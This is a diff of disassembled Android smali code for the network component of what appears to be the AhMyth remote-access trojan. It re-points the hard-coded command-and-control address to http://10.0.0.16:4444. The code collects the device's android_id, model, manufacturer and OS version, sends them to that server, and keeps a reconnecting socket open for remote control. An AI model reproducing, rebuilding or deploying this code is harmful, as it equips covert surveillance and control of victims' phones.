@@ -15,8 +15,7 @@
 .method static constructor <clinit>()V
     .locals 1
 
-    .prologue
-    .line 18
+    .line 14
     new-instance v0, Lahmyth/mine/king/ahmyth/IOSocket;
 
     invoke-direct {v0}, Lahmyth/mine/king/ahmyth/IOSocket;-><init>()V
@@ -27,139 +26,139 @@
 .end method
 
 .method private constructor <init>()V
-    .locals 6
+    .locals 4
 
-    .prologue
-    .line 23
+    .line 19
     invoke-direct {p0}, Ljava/lang/Object;-><init>()V
 
-    .line 26
+    .line 22
     :try_start_0
     invoke-static {}, Lahmyth/mine/king/ahmyth/MainService;->getContextOfApplication()Landroid/content/Context;
 
-    move-result-object v3
+    move-result-object v0
 
-    invoke-virtual {v3}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;
-
-    move-result-object v3
-
-    const-string v4, "android_id"
-
-    invoke-static {v3, v4}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;
+    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;
 
     move-result-object v0
 
-    .line 27
-    .local v0, "deviceID":Ljava/lang/String;
-    new-instance v2, Lio/socket/client/IO$Options;
+    const-string v1, "android_id"
 
-    invoke-direct {v2}, Lio/socket/client/IO$Options;-><init>()V
+    invoke-static {v0, v1}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v0
+
+    .line 23
+    .local v0, "deviceID":Ljava/lang/String;
+    new-instance v1, Lio/socket/client/IO$Options;
+
+    invoke-direct {v1}, Lio/socket/client/IO$Options;-><init>()V
+
+    .line 24
+    .local v1, "opts":Lio/socket/client/IO$Options;
+    const/4 v2, 0x1
+
+    iput-boolean v2, v1, Lio/socket/client/IO$Options;->reconnection:Z
+
+    .line 25
+    const-wide/16 v2, 0x1388
+
+    iput-wide v2, v1, Lio/socket/client/IO$Options;->reconnectionDelay:J
+
+    .line 26
+    const-wide/32 v2, 0x3b9ac9ff
+
+    iput-wide v2, v1, Lio/socket/client/IO$Options;->reconnectionDelayMax:J
 
     .line 28
-    .local v2, "opts":Lio/socket/client/IO$Options;
-    const/4 v3, 0x1
+    new-instance v2, Ljava/lang/StringBuilder;
 
-    iput-boolean v3, v2, Lio/socket/client/IO$Options;->reconnection:Z
+    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V
 
-    .line 29
-    const-wide/16 v4, 0x1388
+    const-string v3, "http://10.0.0.16:4444?model="
 
-    iput-wide v4, v2, Lio/socket/client/IO$Options;->reconnectionDelay:J
+    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
 
-    .line 30
-    const-wide/32 v4, 0x3b9ac9ff
+    move-result-object v2
 
-    iput-wide v4, v2, Lio/socket/client/IO$Options;->reconnectionDelayMax:J
+    sget-object v3, Landroid/os/Build;->MODEL:Ljava/lang/String;
 
-    .line 32
-    new-instance v3, Ljava/lang/StringBuilder;
-
-    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V
-
-    const-string v4, "http://192.168.8.100:42474?model="
-
-    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-static {v3}, Landroid/net/Uri;->encode(Ljava/lang/String;)Ljava/lang/String;
 
     move-result-object v3
 
-    sget-object v4, Landroid/os/Build;->MODEL:Ljava/lang/String;
+    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
 
-    invoke-static {v4}, Landroid/net/Uri;->encode(Ljava/lang/String;)Ljava/lang/String;
+    move-result-object v2
 
-    move-result-object v4
+    const-string v3, "&manf="
 
-    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
 
-    move-result-object v3
+    move-result-object v2
 
-    const-string v4, "&manf="
+    sget-object v3, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;
 
-    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
 
-    move-result-object v3
+    move-result-object v2
 
-    sget-object v4, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;
+    const-string v3, "&release="
 
-    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
 
-    move-result-object v3
+    move-result-object v2
 
-    const-string v4, "&release="
+    sget-object v3, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;
 
-    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
 
-    move-result-object v3
+    move-result-object v2
 
-    sget-object v4, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;
+    const-string v3, "&id="
 
-    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
 
-    move-result-object v3
+    move-result-object v2
 
-    const-string v4, "&id="
+    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
 
-    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    move-result-object v2
 
-    move-result-object v3
+    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
 
-    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    move-result-object v2
 
-    move-result-object v3
+    invoke-static {v2}, Lio/socket/client/IO;->socket(Ljava/lang/String;)Lio/socket/client/Socket;
 
-    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    move-result-object v2
 
-    move-result-object v3
-
-    invoke-static {v3}, Lio/socket/client/IO;->socket(Ljava/lang/String;)Lio/socket/client/Socket;
-
-    move-result-object v3
-
-    iput-object v3, p0, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;
+    iput-object v2, p0, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;
     :try_end_0
     .catch Ljava/net/URISyntaxException; {:try_start_0 .. :try_end_0} :catch_0
 
-    .line 36
+    .line 31
     .end local v0    # "deviceID":Ljava/lang/String;
-    .end local v2    # "opts":Lio/socket/client/IO$Options;
+    .end local v1    # "opts":Lio/socket/client/IO$Options;
+    goto :goto_0
+
+    .line 29
+    :catch_0
+    move-exception v0
+
+    .line 30
+    .local v0, "e":Ljava/net/URISyntaxException;
+    invoke-virtual {v0}, Ljava/net/URISyntaxException;->printStackTrace()V
+
+    .line 32
+    .end local v0    # "e":Ljava/net/URISyntaxException;
     :goto_0
     return-void
-
-    .line 33
-    :catch_0
-    move-exception v1
-
-    .line 34
-    .local v1, "e":Ljava/net/URISyntaxException;
-    invoke-virtual {v1}, Ljava/net/URISyntaxException;->printStackTrace()V
-
-    goto :goto_0
 .end method
 
 .method public static getInstance()Lahmyth/mine/king/ahmyth/IOSocket;
     .locals 1
 
-    .prologue
-    .line 40
+    .line 36
     sget-object v0, Lahmyth/mine/king/ahmyth/IOSocket;->ourInstance:Lahmyth/mine/king/ahmyth/IOSocket;
 
     return-object v0
@@ -170,8 +169,7 @@
 .method public getIoSocket()Lio/socket/client/Socket;
     .locals 1
 
-    .prologue
-    .line 44
+    .line 40
     iget-object v0, p0, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;
 
     return-object v0
